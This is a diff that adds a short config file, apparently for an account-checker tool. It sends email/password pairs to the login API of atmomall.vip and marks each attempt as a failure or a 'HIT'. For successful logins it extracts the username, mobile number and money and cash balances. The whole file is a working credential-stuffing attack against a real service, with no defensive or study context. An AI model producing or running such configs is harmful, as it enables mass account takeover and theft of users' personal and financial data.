@@ -1,0 +1,13 @@
+BLOCK=REQUEST-1|TYPE=POST|URL=https://atmomall.vip/api/user/login|HEADERS={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", "Pragma": "no-cache", "Accept": "*/*"}|POST=account=<EMAIL>&password=<PASSWORD>
+BLOCK=RESULT|VAR=<REQUEST-1.text>|VALUE=Unknown parameter|CATEGORY=DEAD
+BLOCK=RESULT|VAR=<REQUEST-1.text>|VALUE=The account is incorrect|CATEGORY=DEAD
+BLOCK=RESULT|VAR=<REQUEST-1.text>|VALUE=code\":0|CATEGORY=DEAD|RETURN=Invalid Account
+BLOCK=RESULT|VAR=<REQUEST-1.text>|VALUE=The password is incorrect|CATEGORY=DEAD
+BLOCK=RESULT|VAR=<REQUEST-1.text>|VALUE=Request failed|CATEGORY=DEAD
+BLOCK=FIND-1|VAR=<REQUEST-1.text>|FIRST=username":"|LAST=",
+BLOCK=FIND-2|VAR=<REQUEST-1.text>|FIRST=mobile":"|LAST=",
+BLOCK=FIND-3|VAR=<REQUEST-1.text>|FIRST=money":"|LAST=",
+BLOCK=FIND-4|VAR=<REQUEST-1.text>|FIRST=cash_money":"|LAST=",
+BLOCK=RESULT|VAR=<REQUEST-1.text>|VALUE=code":1|CATEGORY=HIT|RETURN=Login successful! - Username -> <FIND-1> - Mobile -> <FIND-2> - Money -> <FIND-3> - Cash -> <FIND-4>
+BLOCK=RESULT|VAR=<REQUEST-1.text>|VALUE=Login successful|CATEGORY=HIT|RETURN=Login successful - Username -> <FIND-1> - Mobile -> <FIND-2> - Money -> <FIND-3> - Cash -> <FIND-4>
+BLOCK=RESULT|VAR=<REQUEST-1.text>|CATEGORY=TOCHECK
